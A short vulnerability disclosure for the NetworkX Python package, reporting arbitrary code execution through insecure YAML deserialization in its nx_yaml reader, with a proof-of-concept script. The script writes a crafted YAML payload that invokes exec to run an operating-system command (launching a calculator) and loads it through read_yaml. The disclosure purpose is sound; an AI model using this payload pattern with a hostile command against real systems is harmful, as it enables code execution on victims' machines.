# Description

**NetworkX** is a Python package for the creation, manipulation, and study of the structure, dynamics, and functions of complex networks.
This package was vulnerable to Arbitrary code execution via Insecure YAML deserialization due to the use of a known vulnerable function **load()** in **yaml**. <br>

repo: https://github.com/networkx/networkx

# Proof of Concept

```python
from networkx.readwrite import nx_yaml

payload = '''
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
'''
open('pwn.yml', 'w+').write(payload)

nx_yaml.read_yaml('pwn.yml')
print("pwned! 🏴")
```

* `pip3 install networkx`
* `python3 exploit.py`
